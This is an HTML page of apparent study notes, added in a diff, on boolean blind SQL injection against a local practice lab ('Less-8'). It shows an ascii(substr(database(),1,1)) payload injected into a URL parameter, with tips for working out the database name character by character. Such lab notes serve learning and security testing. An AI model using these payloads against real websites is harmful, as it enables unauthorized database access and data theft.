@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Ascii function</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Ascii function</h1><br/><br /><div class="codebox"><div class="codebox">mysql&gt;&nbsp;SELECT&nbsp;ascii(substr(<span style="color:#0057ae;font-weight:400">database()</span>,&nbsp;1,&nbsp;1));<br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><a href=""><img src="images/130-1.png" alt="images/130-1.png" /></a><br /><br />Result: ASCII number of the first character of the DB name.<br /><br />We can use this for every character in the name.<br /><br />On the browser you can queris like the following.<br /><br />URL:  http://localhost/Less-8/?id=1&#39;  AND <strong>ascii</strong><strong><span style="color:#a52a2a;">(</span></strong><strong>substr</strong><strong><span style="color:#a52a2a;">(</span></strong><strong><span style="color:#008a8c;">database()</span></strong><strong>, 1, 1</strong><strong><span style="color:#a52a2a;">))</span></strong> <strong>= 115 </strong>--+<br /><br /><a href=""><img src="images/130-2.png" alt="images/130-2.png" /></a><br /><br />Result: It&#39;s TRUE.<br /><br /><br />We can use “&lt; or &gt;” too to limit the numbers to search in.<br /><br />We can try different cases in order to get the character we&#39;re looking for.<br /><br /><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>
